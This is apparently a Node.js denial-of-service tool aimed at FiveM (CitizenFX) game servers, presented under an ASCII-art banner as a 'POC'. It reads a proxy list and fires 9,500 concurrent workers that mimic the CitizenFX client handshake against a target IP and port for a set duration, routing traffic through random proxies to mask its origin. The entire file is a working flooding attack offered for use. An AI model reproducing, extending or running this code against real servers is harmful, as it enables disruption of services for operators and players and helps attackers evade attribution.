const axios = require('axios');
const fs = require('fs').promises;
const uuid = require('uuid');
const readline = require('readline');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const { setTimeout } = require('timers');
const chalk = require('chalk');


const http = require('http');
const https = require('https');


async function loadProxies() {
    const data = await fs.readFile('http.txt', 'utf-8');
    return data.split('\n');
}


function getProxy(proxies) {
    return proxies[Math.floor(Math.random() * proxies.length)];
}


const makeRequest = async (axiosInstance, url, method, headers, data) => {
    try {
        const response = await axiosInstance({ url, method, headers, data });
        return response;
    } catch (error) {
        console.error(`Error with ${url}:`, error.message);
        return null;
    }
};


async function worker(ip, port, secs, proxies) {
    const proxy = getProxy(proxies);
    const token = uuid.v4();
    const clientHeaders = {
        'Host': `${ip}:${port}`,
        'User-Agent': 'CitizenFX',
        'Accept': '*/*'
    };
    const postData = {
        method: 'getEndpoints',
        token: token
    };
    const postHeaders = {
        'Host': `${ip}:${port}`,
        'User-Agent': 'CitizenFX/1',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '62'
    };


    const agent = new http.Agent({ keepAlive: true });
    const httpsAgent = new https.Agent({ keepAlive: true });

    const axiosInstance = axios.create({
        baseURL: `http://${ip}:${port}`,
        headers: clientHeaders,
        timeout: 10000,
        proxy: {
            host: proxy.split(':')[0],
            port: proxy.split(':')[1]
        },
        httpAgent: agent,
        httpsAgent: httpsAgent
    });


    while (Date.now() / 1000 < secs) {
        let client = await makeRequest(axiosInstance, '/info.json', 'get', clientHeaders);

        if (client && client.status === 200) {
            console.log(`(1/4) [${proxy}] -> Init Client Request!`);
        } else {
            console.log(`_FAILED_ (1/4) [${proxy}] -> Breaking Down Proxy Connection!`);
            break;
        }

        client = await makeRequest(axiosInstance, '/client', 'post', postHeaders, postData);

        if (client && client.status === 200) {
            console.log(`(2/4) [${proxy}] -> Posted Client Data!`);
        } else {
            console.log(`_FAILED_ (2/4) [${proxy}] -> Breaking Down Proxy Connection!`);
            break;
        }

        clientHeaders['User-Agent'] = 'CitizenFX/1';
        client = await makeRequest(axiosInstance, '/info.json', 'get', clientHeaders);

        if (client && client.status === 200) {
            console.log(`(3/4) [${proxy}] -> Init Client Request 2!`);
        } else {
            console.log(`_FAILED_ (3/4) [${proxy}] -> Breaking Down Proxy Connection!`);
            break;
        }

        postData['X-CitizenFX-Token'] = token;
        postHeaders['User-Agent'] = 'CitizenFX/1';
        postHeaders['Content-Length'] = '23';
        postData['method'] = 'getConfiguration';
        client = await makeRequest(axiosInstance, '/client', 'post', postHeaders, postData);

        if (client && client.status === 200) {
            console.log(`(4/4) [${proxy}] -> Posted Client Data Config!`);
        } else {
            console.log(`_FAILED_ (4/4) [${proxy}] -> Breaking Down Proxy Connection!`);
            break;
        }

        clientHeaders['User-Agent'] = 'curl/7.83.1-DEV';
        client = await makeRequest(axiosInstance, '/info.json', 'get', clientHeaders);

        if (client && client.status === 200) {
            console.log(`(Final) [${proxy}] -> Init Client Request Success!`);
        } else {
            console.log(`_FAILED_ (Final) [${proxy}] -> Breaking Down Proxy Connection!`);
            break;
        }

        break;
    }
}


async function startWorkers(ip, port, timeLimit) {
    const proxies = await loadProxies();
    const workers = [];

    for (let i = 0; i < 9500; i++) {
        workers.push(new Promise((resolve, reject) => {
            worker(ip, port, timeLimit, proxies)
                .then(resolve)
                .catch(reject);
        }));
    }


    await Promise.all(workers);
}


const args = process.argv.slice(2);
if (args.length !== 4) {
    const banner = `
                                               _..  
                                          .qd$$$$bp.
                                        .q$$$$$$$$$$m.
                                       .$$$$$$$$$$$$$$                      
                                     .q$$$$$$$$$$$$$$$$                      Author : Minatsukix86
                                    .$$$$$$$$$$$$P\\$$$$;                    
                                  .q$$$$$$$$$P^"_.\`;$$$$
                                 q$$$$$$$P;\\   ,  /$$$$P
                               .$$$P^::Y$/\`  _  .:.$$$/
                              .P.:..    \\ \`._.-:.. \\$P
                              $':.  __.. :   :..    :'
                             /:_..::.   \`. .:.    .'|
                           _::..          T:..   /  :
                        .::..             J:..  :  :
                     .::..          7:..   F:.. :  ;
                 _.::..             |:..   J:.. \`./
            _..:::..               /J:..    F:.  : 
          .::::..                .T  \\:..   J:.  /
         /:::...               .' \`.  \\:..   F_o'
        .:::...              .'     \\  \\:..  J ;
        ::::...           .-'\`.    _.\`._\\:..  \\' 
        ':::...         .'  \`._7.-'_.-  \`\\:.   \\ 
         \\:::...   _..-'__.._/_.--' ,:.   b:.   \\._ 
          \`::::..-"_.'-"_..--"      :..   /):.   \`.\\   
            \`-:/"-7.--""            _::.-'P::..    \\} 
 _....------""""""            _..--".-'   \\::..     \`. 
(::..              _...----"""  _.-'       \`---:..    \`-.
 \\::..      _.-""""   \`""""---""                \`::...___)
  \`\\:._.-"""                             
    `;

    console.log(chalk.red(banner));
    console.log(chalk.red('FiveM - POC, Invalid usage...'));
    console.log(chalk.red('Usage: IP PORT SafeMode time'));
    process.exit();
}

const [ip, port, safeMode, time] = args;
const safeModeEnabled = safeMode.toLowerCase() === 'true';
const timeLimit = Date.now() / 1000 + parseInt(time);


startWorkers(ip, port, timeLimit);
